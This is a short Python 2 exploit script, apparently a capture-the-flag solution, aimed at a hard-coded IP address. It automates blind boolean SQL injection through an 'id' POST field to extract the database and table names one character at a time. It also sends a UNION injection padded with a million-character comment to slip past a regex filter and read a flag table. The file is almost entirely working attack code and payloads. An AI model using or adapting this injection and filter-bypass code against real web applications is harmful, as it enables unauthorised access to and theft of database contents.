import requests
from time import sleep
from string import printable

url='http://45.77.240.178:8002/index.php'


def dump_database():
	j=1
	result=''
	while j<=10:
		#length of database can be found using : 2 && length(database())<11
		for i in printable:
				if i!='%':
					r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'2 && ascii(substr(database(),{},10))=ascii("{}")'.format(j,i)},proxies={'http':'http://127.0.0.1:8080'})
					if 'guest' in r.text:
						result=result+i
						print '[+] Database Name : {}'.format(result)
						break
		j+=1

def dump_tablenames():
	result=''
	j=1
	while j<=25:
		for i in printable:
			# length of table 1 is :  2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 0,1))=5 we can guess its users
			#second table length is : 2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1))=25
			if i!='%':
				r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'2 && ascii(substr((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1),{},25))=ascii("{}")'.format(j,i)})
				if 'guest' in r.text:
					result=result+i
					print '[+] Table Name : {}'.format(result)
					sleep(1)
					break
		j+=1
		sleep(0.5)

def union_bypass():
	#payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'
	payload='union/*'+'a'*1000000+'*/select 1,(select b from (select 1 as a, 2 as b union/*'+'a'*1000000+'*/select * from Th1z_Fack1n_Fl4444g_Tabl3) bbb limit 1,1),3-- -'
	r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'-2 {}'.format(payload)},proxies={'http':'http://127.0.0.1:8080'})
	print r.text

if __name__=="__main__":
	print '1. Dump Database Name'
	print '2. Find Table Names'
	print '3. Union Bypass (PHP & RegEx Bug)'
	input = raw_input('> ').strip()
	if input=='1':
		dump_database()
	elif input=='2':
		dump_tablenames()
	else:
		union_bypass()
